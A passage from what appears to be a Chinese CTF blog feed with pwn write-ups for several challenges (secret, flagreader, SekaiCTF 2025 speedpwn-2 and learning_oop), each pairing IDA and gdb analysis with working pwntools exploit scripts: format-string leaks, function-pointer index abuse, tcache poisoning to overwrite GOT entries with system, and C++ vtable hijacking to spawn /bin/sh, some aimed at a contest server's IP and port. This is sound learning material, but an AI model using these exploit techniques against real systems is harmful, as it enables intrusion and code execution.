class="number">0x00000000004012d3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment">## </span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><p><strong>先进行了一下小小的逆向，把一些变量和函数名字改了一下</strong></p><h4 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524200824362.png"><br>1.第一眼看到输入赋值给v3,但v3是数组。v3[0]是我们的选项<br>2.关于后续功能的实现有猫腻，<code>funcs[v3[0]-1]()</code>.稍微有点经验就能看出来，这是在调用funcs[]中的函数，那么funcs中到底有什么呢？跟进去看看。</p><h4 id="funcs数组分析"><a href="#funcs数组分析" class="headerlink" title="funcs数组分析"></a>funcs数组分析</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201339633.png" alt="image-20250524201339633"><br>1.对ida熟悉一点，就知道这里存放的是函数的地址，分别就是menu中三个选项对应的函数。<br>2.所以假设前面的v3&#x3D;1，那么就会执行funcs[0],也就是加密。<br>3.理清了程序执行功能的逻辑，再来看每个功能。这题最关键的事encrypt，我在这里就自分析这个。</p><h4 id="encrypt分析"><a href="#encrypt分析" class="headerlink" title="encrypt分析"></a>encrypt分析</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201727975.png" alt="image-20250524201727975"><br>1.首先会往abcd这里读入0x50字节的数据。<br>2.然后会对这些数据作加密处理，而加密的方式是与某个数组中的一个数，按位异或。<br>3.知道按位异或的作用，a^b&#x3D;c &#x3D;&#x3D;&gt; a&#x3D;b^c,因此，加密的结果再加密，就是原值。<br>4.用来加密的数组就是funcs图中的s1yner<br>5.abcd同样位于data段，并且里funcs很近。</p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>1.第一个想法是通过Encrypt中的溢出，覆盖掉funcs的函数，为backdoor(题目留的后门函数，可以cat flag)。但是只有0x50字节，不够，只能刚好写满abcd那个数组。这里意识到，我们只能把后门写在abcd这个数组上。所以应该考虑有没有办法，访问到这里呢？<br>2.继续回去观察main函数，看到输入后会检测v3是否大于3。也就是小于等于3，都是合法的输入。试想，如果输入0，那么最后就是<code>func[-1]()</code>,也就是会调用我们最后输入的8字节的地址。因此，我们可以输入0 和 负数，来访问abcd上的地址。只要对应上。<br>3.那接下来就是解决，加密的问题。很简单，将log_level设置为debug，发送正常的backdoor地址，看看返回的加密内容是什么。然后手敲一下backdoor的地址，把加密后的内容作为原文发送，那么正确的地址就会在加密后被写上去。</p><h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><h4 id="加密内容获取"><a href="#加密内容获取" class="headerlink" title="加密内容获取"></a>加密内容获取</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524203433694.png" alt="image-20250524203433694"><br>1.直接发送p64(backdoor)，查看加密的内容。<br>2.从后往前数，因为后面紧跟的是<code>1.Encrupt......</code>，从0x31 往前数8个字节，就是我们要的内容，然后直接发这个就行。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">mode=<span class="number">0</span></span><br><span class="line">url=<span class="string">&#x27;43.139.51.42&#x27;</span></span><br><span class="line">port=<span class="number">38403</span></span><br><span class="line"><span class="keyword">if</span> mode==<span class="number">0</span> :</span><br><span class="line">io=process(<span class="string">&quot;./secret&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io=remote(url,port)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x4014a7</span></span><br><span class="line">offset=<span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">key=[<span class="string">&quot;s&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;r&quot;</span>]</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#payload+=p64(backdoor)</span></span><br><span class="line">payload+=<span class="string">b&#x27;\xc2\x66\x33\x31\x6e\x79\x65\x72&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="flagreader"><a href="#flagreader" class="headerlink" title="flagreader"></a>flagreader</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><h4 id="main函数分析-1"><a href="#main函数分析-1" class="headerlink" title="main函数分析"></a>main函数分析</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204127748.png" alt="image-20250524204127748"><br>1.开幕雷击，直接就是一个gift给我们。显然是一个地址，可能需要这个地址泄露一些东西。<br>2.同时还有两个函数，一个readflag，一个vuln。直接跟进。</p><h4 id="readflag函数分析"><a href="#readflag函数分析" class="headerlink" title="readflag函数分析"></a>readflag函数分析</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204334952.png" alt="image-20250524204334952"><br><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204424654.png" alt="image-20250524204424654"><br>1.首先看伪代码，发现是把flag读取了0x50字节，写在了<code>&amp;_bss_start[6]._IO_read_end</code>上。但是这个，到底是哪个地址呢？<br>2.观察汇编的代码，可以看到rsi也就读入的地址是rcx，而rcx 又是 rax+0x520，rax又是__bss_start.所以可以知道rsi&#x3D;__bss_start+0x520.<br>3.而我们的gift就是__bss_start.</p><h4 id="vuln函数分析"><a href="#vuln函数分析" class="headerlink" title="vuln函数分析"></a>vuln函数分析</h4><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204837954.png" alt="image-20250524204837954"><br>1.非常明显的格式化字符串漏洞，结合上文。第一个想到把flag的地址写入，同时用”%s”对flag内容进行打印。<br>2.64位要加上6，因为有前6个寄存器。最后的偏移还是需要gdb查看。因为可以输入0x10，所以可以把__bss_start+0x520布置在下面。</p><h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524205449833.png" alt="image-20250524205449833"><br>1.找到printf函数的栈帧，可以看到我们的输入是在偏移为0 的位置，加上6就是6.<br>2.把地址写在下面的话，偏移就是7。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;43.139.51.42&#x27;</span></span><br><span class="line">port=<span class="number">38430</span></span><br><span class="line"><span class="keyword">if</span> mode==<span class="number">0</span> :</span><br><span class="line">io=process(<span class="string">&quot;./flagreader&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io=remote(url,port)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Here is your gift: &quot;</span>)</span><br><span class="line">bss_start=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;bss-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss_start)))</span><br><span class="line">flag=bss_start+<span class="number">1312</span></span><br><span class="line">payload=<span class="string">b&#x27;%7$s&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">payload+=p64(flag)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 新生赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sekaictf-2025-pwn</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/sekaictf-2025-pwn/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/sekaictf-2025-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="sekaictf–pwn复现"><a href="#sekaictf–pwn复现" class="headerlink" title="sekaictf–pwn复现"></a>sekaictf–pwn复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>备战下一场xctf分站赛</p><h2 id="speedpwn-2"><a href="#speedpwn-2" class="headerlink" title="speedpwn-2"></a>speedpwn-2</h2><p>这是一道tcache 利用的题目，赛后复盘是有源码的，但我们这里还是从写题的角度进行一个分析</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901184359282.png" alt="图1"></p><p> <code>main</code> 函数 首先申请了<code>0x190</code>大小的堆块作为一块画布, 然后循环进行操作. 每次循环的开始会调用<code>print_canvas</code> 把画布的内容打印出来,然后用户可以输入<code>p,r,h</code> 进行对应的操作</p><ol><li>p , 修改堆块的一个字节</li><li>r , 重新申请堆块</li><li>h , 打印操作的说明</li></ol><p>图1 就是 r , 对应的操作</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901185458942.png" alt="图2"></p><p>图2 这里是p , 对应的操作.<br>在75 行这里,就是一个明显的溢出漏洞. 因为这里没有对范围的检测 , 所以我们可以输入非法值 , 去修改不在这个堆块范围内的堆空间的值 .</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>题目环境是 2.34的libc</p><ol><li>首先是泄露libc . 题目没有开启<code>ALSR</code>和<code>FULL RELRO</code> ,  可以从<code>ida</code>里获取函数<code>plt</code>的地址 , 同时可以修改<code>got</code> 表 . 首先 ,  利用 溢出漏洞 ,  修改 <code>tcache_perthread_struct</code> 的 <code>counts</code> 和 <code>entries</code>, 把 <code>.got</code>表 附近的某一段 放入<code>tcache bins</code> 中 ,  再利用 <code>r</code> 把这个块空间分配出来.</li><li>然后是 ,  修改<code>got</code> 表. 利用上面的溢出漏洞 , 把 <code>free</code> 修改为<code>printf</code>, 利用格式化字符串  , 泄露出<code>libc</code>.</li><li>重复 1 的步骤 , 把这个堆块 重新申请回来. 因为当时<code>free</code> 被修改为了 <code>printf</code>, 所以不能直接申请 ,  得重复1 的步骤.</li><li>这一次把free修改为system , 然后把堆块内容设置为<code>/bin/sh\x00</code></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">port=<span class="number">0</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./chall&quot;</span>,url,port)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr_c</span>(<span class="params">r,l,c</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">b&quot;p&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(l))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(c)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_c</span>(<span class="params">r,l</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">b&quot;r&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(l))</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401605&quot;</span>)</span><br><span class="line">pr_c(<span class="number">0</span>,-<span class="number">0x290</span>,<span class="number">0x1</span>)</span><br><span class="line">bss=<span class="number">0x404070</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> bss &gt; <span class="number">0</span>:</span><br><span class="line">pr_c(<span class="number">0</span>,-<span class="number">0x210</span>+i,bss &amp; <span class="number">0xff</span>)</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line">bss&gt;&gt;=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">re_c(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line">printf=<span class="number">0x401100</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">pr_c(<span class="number">0</span>,-<span class="number">0x70</span>+i,printf &amp; <span class="number">0xff</span>)</span><br><span class="line">printf&gt;&gt;=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%17$p&quot;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(pay):</span><br><span class="line">    pr_c(<span class="number">0</span>, i, j) </span><br><span class="line">re_c(<span class="number">20</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">leak=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak-<span class="number">0x2a1ca</span></span><br><span class="line">system=libc_base+<span class="number">0x58750</span> </span><br><span class="line">logv(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">logv(<span class="string">&quot;system&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">pr_c(<span class="number">0</span>,-<span class="number">0x290</span>,<span class="number">0x1</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">bss=<span class="number">0x404070</span></span><br><span class="line"><span class="keyword">while</span> bss &gt; <span class="number">0</span>:</span><br><span class="line">pr_c(<span class="number">0</span>,-<span class="number">0x210</span>+i,bss &amp; <span class="number">0xff</span>)</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line">bss&gt;&gt;=<span class="number">8</span></span><br><span class="line">re_c(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">pr_c(<span class="number">0</span>,-<span class="number">0x70</span>+i,system &amp; <span class="number">0xff</span>)</span><br><span class="line">system&gt;&gt;=<span class="number">8</span></span><br><span class="line">pay=<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(pay):</span><br><span class="line">    pr_c(<span class="number">0</span>, i, j)</span><br><span class="line">re_c(<span class="number">20</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="learning-oop"><a href="#learning-oop" class="headerlink" title="learning_oop"></a>learning_oop</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901194344121.png" alt="图3"></p><p>首先漏洞点 ,  很明显是<code>set_name</code> 函数中的溢出漏洞 , 可以往下溢出覆盖下面的堆块. 然后堆块申请都是固定大小<code>0x120</code></p><p>可以看到这是一个<code>c++</code>的程序 ,  他的堆块都是 作为对象申请的. 这里应该是 用 <code>Animal</code> 这样一个类 , 然后 <code>Dog</code>,<code>Cat</code>,<code>Horse</code>,<code>Parrot</code> 类继承了<code>Animal</code>,并对其中的某些方法重写了.</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901203517642.png" alt="image.png"></p><p>在初始化一个动物的时候 , 在<code>fd</code> 的位置 写了一个虚表的地址 ,后续的函数调用都是靠这个地址去寻找和调用函数.</p><p>年龄,饥饿值,体力,其实是堆块最后<code>0x10</code>字节保存的数据. 同时 ,  意识到 ,  可以溢出修改这个部分 , 去控制 动物的 这些信息.</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901204229246.png"></p><p>这里 可以通过控制 <code>fd</code> 也就是劫持虚表 ,  来完成调用自己想要的函数.</p><h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><p>题目环境是2.39的libc . (没有版本讲堆题,都是在耍流氓)</p><ol><li>首先要泄露<code>libc</code> , 然后劫持虚表 , 这里应该是很容易想到的. 那么如何泄露<code>libc</code>呢? 肯定是通过<code>unsorted bin</code> 了. 然后让堆块进入<code>unsorted bin</code>呢? 如果填满一个<code>tcache bins</code> , 再 <code>free</code> 一个<code>0x120</code> 的堆块, 看样子可行,但可以没有<code>uaf</code> 漏洞,这样利用会很困难. 所以 , 通过溢出修改堆块 的<code>size</code> 造一个0x481 的堆块 ,  造一个重叠. 因为这个大小的堆块超过了<code>tcahce bins</code>的大小会直接进入<code>unsorted bin</code>.</li><li>这个时候 再申请一个堆块 , <code>arena</code>信息就会写入到下一个堆块的<code>name</code>的位置, 如果此时下一个堆块恰好<code>die</code> ,就会触发<code>get_name</code> 把信息泄露出来.</li><li>然后劫持<code>vtable</code> ,我们通过在堆上布置一个虚表,在创建成功后,程序会返回堆的地址. 然后只要有合适的<code>gadgets</code>, 就可以调用<code>system</code>. 这里肯定需要的是控制<code>rdi</code>, 同时需要<code>call</code></li></ol><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class="line">io = process(<span class="string">&quot;./learning_oop&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">op</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">species,name</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;4=Horse): &quot;</span>,<span class="built_in">str</span>(species))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter name: \n&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Which pet? \n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">feed</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Which pet? \n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Which pet? \n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">6</span>)+p32(<span class="number">6</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">5</span>)+p32(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">7</span>)+p32(<span class="number">7</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">6</span>)+p32(<span class="number">6</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">5</span>)+p32(<span class="number">5</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">4</span>)+p32(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">2</span>)+p32(<span class="number">2</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">0x10</span>)+p32(<span class="number">0x10</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(<span class="number">0x481</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">io.recvlines(<span class="number">1</span>)</span><br><span class="line">arena=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">logv(<span class="string">&quot;arena&quot;</span>,<span class="built_in">hex</span>(arena))</span><br><span class="line"></span><br><span class="line">libcbase = arena - <span class="number">0x203b20</span></span><br><span class="line">logv(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">题目的</span></span><br><span class="line"><span class="string">0x00000000001cb42f : /bin/sh</span></span><br><span class="line"><span class="string">0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]</span></span><br><span class="line"><span class="string">我的</span></span><br><span class="line"><span class="string">0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]</span></span><br><span class="line"><span class="string">0x00000000001d8678 : /bin/sh</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bin_sh=libcbase+<span class="number">0x1cb42f</span></span><br><span class="line">set_rdi=libcbase+<span class="number">0x9ca97</span></span><br><span class="line">system=libcbase+<span class="number">0x582d2</span></span><br><span class="line">logv(<span class="string">&quot;system&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line">logv(<span class="string">&quot;bin_sh&quot;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"><span class="comment">##  这里的偏移需要对这gdb去找</span></span><br><span class="line">add(<span class="number">1</span>,p64(set_rdi)*<span class="number">4</span>+<span class="string">b&quot;W&quot;</span>*<span class="number">0xe0</span>+p32(<span class="number">5</span>)+p32(<span class="number">5</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0xd281</span>)+<span class="string">b&quot;a&quot;</span>*(<span class="number">0x520</span>-<span class="number">0x128</span>)+p64(system)+p64(bin_sh))<span class="comment">#+p64(bin_sh))</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Adopted new pet: &quot;</span>)</span><br><span class="line">vtable=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">logv(<span class="string">&quot;vtable&quot;</span>,<span class="built_in">hex</span>(vtable))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,p64(set_rdi)*<span class="number">8</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *$rebase(0x143C)&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p32(<span class="number">5</span>)+p32(<span class="number">5</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0x121</span>)+p64(vtable))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="outdated"><a href="#outdated" class="headerlink" title="outdated"></a>outdated</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 